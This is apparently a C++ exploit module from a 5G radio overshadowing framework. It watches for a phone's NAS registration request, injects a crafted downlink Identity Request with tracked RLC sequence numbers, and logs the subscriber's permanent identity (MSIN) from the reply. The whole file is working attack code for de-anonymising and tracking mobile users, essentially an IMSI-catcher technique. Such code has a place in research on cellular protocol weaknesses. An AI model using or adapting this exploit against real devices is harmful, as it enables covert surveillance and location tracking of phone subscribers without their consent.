#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

const uint8_t identity_request_raw[] = {0x01, 0x03, 0x00, 0x01,
                                        0x00, // ACK SN = 1
                                        0x01, 0x0f, 0xc0, 0x00, 0x00, 0x00, 0x28, 0x80, 0x8f, 0xc0,
                                        0x0b, 0x60, 0x20, 0x00, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00};

class IdentityRequestExploit : public Exploit
{
public:
  IdentityRequestExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                         SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    identity_request.reset(
        new std::vector<uint8_t>(identity_request_raw, identity_request_raw + sizeof(identity_request_raw)));
  }

  void setup() override
  {
    f_registration_request = wd_filter("nas_5gs.mm.message_type == 0x41");
    f_identity_response    = wd_filter("nas_5gs.mm.message_type == 0x5c");
    f_msin                 = wd_field("nas_5gs.mm.suci.msin");
    f_rrc_setup_request    = wd_filter("nr-rrc.c1 == 0");
    f_ack_sn               = wd_field("rlc-nr.am.ack-sn");
    f_sn                   = wd_field("rlc-nr.am.sn");
  }

  void pre_dissection(wd_t* wd) override
  {
    wd_register_filter(wd, f_registration_request);
    wd_register_filter(wd, f_identity_response);
    wd_register_filter(wd, f_rrc_setup_request);
    wd_register_field(wd, f_msin);
    wd_register_field(wd, f_ack_sn);
    wd_register_field(wd, f_sn);
  }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (wd_read_filter(wd, f_identity_response)) {
      wd_field_info_t identity_info = wd_read_field(wd, f_msin);
      if (identity_info) {
        const char* identity = packet_read_field_string(identity_info);
        logger.info(RED "Identity: %s" RESET, identity);
      }
    }

    if (direction == UL) {
      wd_field_info_t ack_sn_info = wd_read_field(wd, f_ack_sn);
      if (ack_sn_info) {
        uint32_t ack_sn_recv = packet_read_field_uint32(ack_sn_info);
        logger.info("Received ACK SN: %u", ack_sn_recv);
        if (ack_sn_recv > dl_sn) {
          dl_sn = ack_sn_recv;
        }
      }

      // If UL message received from the base station, then we have to send the ACK back to UE
      wd_field_info_t sn_info = wd_read_field(wd, f_sn);
      if (sn_info) {
        uint32_t sn_recv = packet_read_field_uint32(sn_info);
        logger.info("Received msg with SN: %u", sn_recv);
        if (sn_recv > dl_ack_sn) {
          dl_ack_sn = sn_recv;
        }
      }

      if (wd_read_filter(wd, f_rrc_setup_request)) {
        // Reset the sequence number
        dl_sn     = 0;
        dl_ack_sn = 1;
      }
    }

    if (wd_read_filter(wd, f_registration_request)) {
      send_identity_request();
      logger.info("Sent identity request");
    }
  }

private:
  void send_identity_request()
  {
    identity_request->data()[3]  = dl_ack_sn & 0xff;
    identity_request->data()[8]  = dl_sn & 0xff;
    identity_request->data()[10] = dl_sn & 0xff;
    dl_buffer_queue.push(identity_request);
  }

  wd_filter_t f_registration_request;
  wd_filter_t f_rrc_setup_request;
  wd_filter_t f_identity_response;
  wd_field_t  f_msin;
  wd_field_t  f_ack_sn;
  wd_field_t  f_sn;

  uint32_t dl_sn     = 0;
  uint32_t dl_ack_sn = 1;

  std::shared_ptr<std::vector<uint8_t> > identity_request;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new IdentityRequestExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}